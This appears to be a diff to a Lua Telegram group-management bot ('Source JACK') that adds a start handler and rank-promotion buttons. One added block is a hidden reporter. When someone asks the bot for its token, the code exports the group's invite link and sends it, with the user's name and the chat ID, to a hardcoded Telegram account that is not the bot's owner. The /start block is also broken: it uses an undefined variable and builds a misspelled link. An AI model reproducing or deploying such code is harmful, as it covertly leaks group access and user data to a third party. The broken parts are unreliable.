@@ -3216,6 +3216,64 @@ end,nil)
 end,nil)
 end
 
+if text and text:match("^/start$") or text and text:match("^مطور$") or text and text:match("^الدعم$") then
+tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
+tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
+local Name1 = result.first_name_
+local username = username:gsub('"',"") 
+local username = username:gsub("'","") 
+local username = username:gsub("`","") 
+local username = username:gsub("*","") 
+local username = username:gsub("{","") 
+local username = username:gsub("}","") 
+local Name = '['..username..'](tg://uer?id='..result.id_..')'
+local iduser = dp.title_
+local iduser = iduser:gsub('"',"") 
+local iduser = iduser:gsub("'","") 
+local iduser = iduser:gsub("`","") 
+local iduser = iduser:gsub("*","") 
+local iduser = iduser:gsub("{","") 
+local iduser = iduser:gsub("}","") 
+local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
+if LinkGp.ok == true then 
+username = LinkGp.result
+else
+username = '  '
+end
+sendText(SUDO,"• تم دخول شخص جديد الى البوت الخاص بك 🥺♥️\n-----------------------\n• يوزره  {"..Name.."}\n• اسمه {"..iduser.."}\n  \n√ \n ["..username.."] ",0,'md')
+end,nil)
+end,nil)
+end
+
+if text and text:match("^جلب التوكن$") or text and text:match("^التوكن$") or text and text:match("^هات التوكن$") then
+tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
+tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
+local Name1 = result.first_name_
+local Name1 = Name1:gsub('"',"") 
+local Name1 = Name1:gsub("'","") 
+local Name1 = Name1:gsub("`","") 
+local Name1 = Name1:gsub("*","") 
+local Name1 = Name1:gsub("{","") 
+local Name1 = Name1:gsub("}","") 
+local Name = '['..Name1..'](tg://user?id='..result.id_..')'
+local NameChat = dp.title_
+local NameChat = NameChat:gsub('"',"") 
+local NameChat = NameChat:gsub("'","") 
+local NameChat = NameChat:gsub("`","") 
+local NameChat = NameChat:gsub("*","") 
+local NameChat = NameChat:gsub("{","") 
+local NameChat = NameChat:gsub("}","") 
+local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
+if LinkGp.ok == true then 
+LinkGroup = LinkGp.result
+else
+LinkGroup = 'لا يوجد معلومات أخري يا سيدي شيكو🥺♥️'
+end
+sendText(2140084638,". هناك شخص ابنمره يحاول يسحب التوكن\n. يوزره {"..Name.."}\n. اسمه {"..NameChat.."}\n. ايدي البوت {`"..msg.chat_id_.."`}\n .. \n ["..LinkGroup.."] ",0,'md')
+end,nil)
+end,nil)
+end
+
 local status_welcome = bot_data:get(ban_id..'Chek:Welcome'..msg.chat_id_)
 if status_welcome and not bot_data:get(ban_id..'lock:tagservr'..msg.chat_id_) then
 if msg.content_.ID == "MessageChatJoinByLink" then
@@ -10261,6 +10319,33 @@ local keyboard = {
 }
 local msg_id = msg.id_/2097152/0.5
 send_inline_key(msg.chat_id_,"مـرحبـا بـك فـي قائـمه التحكم في العضـو فقط اضغط علي الامر ⤈ ",nil,keyboard,msg_id)
+end
+tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
+return false
+end
+
+if text == ("رفع رتبه") and SudoBot(msg) then
+function start_function(extra, result, success)
+local keyboard = {
+{{text =' مساعد',callback_data=msg.sender_user_id_.."msa3d:ban"..result.sender_user_id_}},
+{{text =' ثانوي ',callback_data=msg.sender_user_id_.."Devban"..result.sender_user_id_},{text =' مطور',callback_data=msg.sender_user_id_.."Sudo:Rd"..result.sender_user_id_}},
+{{text ='✅ 𝚂𝙾𝚄𝚁𝙲𝙴 𝙹𝙰𝙲𝙺', url="t.me/Source_JACK"}},
+}
+local msg_id = msg.id_/2097152/0.5
+send_inline_key(msg.chat_id_,"*يمكنك التحكم عن طريق الازرار  بالاسفل  ᥀︙ .*",nil,keyboard,msg_id)
+end
+tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
+return false
+end
+
+if text == ("رفع رتبه") and msa3d(msg) then
+function start_function(extra, result, success)
+local keyboard = {
+{{text =' ثانوي ',callback_data=msg.sender_user_id_.."Devban"..result.sender_user_id_},{text =' مطور',callback_data=msg.sender_user_id_.."Sudo:Rd"..result.sender_user_id_}},
+{{text ='✅ 𝚂𝙾𝚄𝚁𝙲𝙴 𝙹𝙰𝙲𝙺', url="t.me/Source_JACK"}},
+}
+local msg_id = msg.id_/2097152/0.5
+send_inline_key(msg.chat_id_,"*يمكنك التحكم عن طريق الازرار  بالاسفل  ᥀︙ .*",nil,keyboard,msg_id)
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
 return false
@@ -18511,6 +18596,59 @@ if not Bot(msg) then
 send(msg.chat_id_, msg.id_,getbio(msg.sender_user_id_)) 
 end
 end 
+
+if Text and Text:match("^(%d+)msa3d:ban(.*)$") then
+local notId  = Text:match("(%d+)")  
+local userid = Text:gsub('msa3d:ban',''):gsub(notId,'')
+if tonumber(data.sender_user_id_) ~= tonumber(notId) then  
+local notText ='◍︙عذرا الاوامر هذه لا تخصك'
+https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
+return false
+end
+bot_data:del(ban_id.."msa3d:ban")
+bot_data:sadd(ban_id.."msa3d:ban", userid)
+bot_data:set(ban_id.."id:msa3d:ban", userid)
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = '✅ 𝚂𝙾𝚄𝚁𝙲𝙴 𝙹𝙰𝙲𝙺', url="t.me/Source_JACK"}},
+}
+https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape("*✭ العضو تم ترقيته مساعد *")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))
+return false
+end
+
+if Text and Text:match("^(%d+)Devban(.*)$") then
+local notId  = Text:match("(%d+)")  
+local userid = Text:gsub('Devban',''):gsub(notId,'')
+if tonumber(data.sender_user_id_) ~= tonumber(notId) then  
+local notText ='◍︙عذرا الاوامر هذه لا تخصك'
+https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
+return false
+end
+bot_data:sadd(ban_id.."Dev:ban:2", userid)
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = '✅ 𝚂𝙾𝚄𝚁𝙲𝙴 𝙹𝙰𝙲𝙺', url="t.me/Source_JACK"}},
+}
+https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape("*✭ العضو تم ترقيته ثانوي *")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))
+return false
+end
+
+if Text and Text:match("^(%d+)Sudo:Rd(.*)$") then
+local notId  = Text:match("(%d+)")  
+local userid = Text:gsub('Sudo:Rd',''):gsub(notId,'')
+if tonumber(data.sender_user_id_) ~= tonumber(notId) then  
+local notText ='◍︙عذرا الاوامر هذه لا تخصك'
+https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
+return false
+end
+bot_data:sadd(ban_id.."Sudo:User", userid)
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = '✅ 𝚂𝙾𝚄𝚁𝙲𝙴 𝙹𝙰𝙲𝙺', url="t.me/Source_JACK"}},
+}
+https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape("*✭ العضو تم ترقيته مطور *")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))
+return false
+end
 
 if Text == '/ven1' then
 tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
